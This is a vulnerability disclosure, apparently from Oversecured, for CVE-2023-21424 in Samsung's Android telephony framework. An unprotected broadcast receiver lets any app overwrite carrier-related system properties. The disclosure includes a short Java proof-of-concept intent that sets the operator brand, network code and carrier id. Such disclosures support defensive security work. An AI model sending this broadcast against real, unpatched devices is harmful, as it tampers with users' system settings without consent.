# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/telephony-common.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.03</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21424">CVE-2023-21424</a> (SVE-2022-2118)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$350</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/103.%20Framework%20—%20Changing%20network%20code,%20carrier%20id,%20and%20operator%20brand/Oversecured_report.png)

Oversecured found in the `com/android/internal/telephony/SemChameleonHelper.java` file the unprotected dynamic receiver registration. It handles the `android.intent.action.CHAMELEON_TELEPHONY_UPDATE` action and the fields that are passed to `SystemProperties`:
- `brandalpha`, set to `ro.ril.cdma.home.operator.alpha`
- `networkcode`, set to `ro.ril.cdma.home.operator.numeric`
- `resellerid`, set to `ro.ril.home.operator.carrierid`

The attacker can use this receiver to change the system settings.

**Proof of Concept**

```java
Intent i = new Intent("android.intent.action.CHAMELEON_TELEPHONY_UPDATE");
i.putExtra("brandalpha", "133737");
i.putExtra("networkcode", "133737");
i.putExtra("resellerid", "133737");
i.putExtra("speeddial", "133737");
sendBroadcast(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
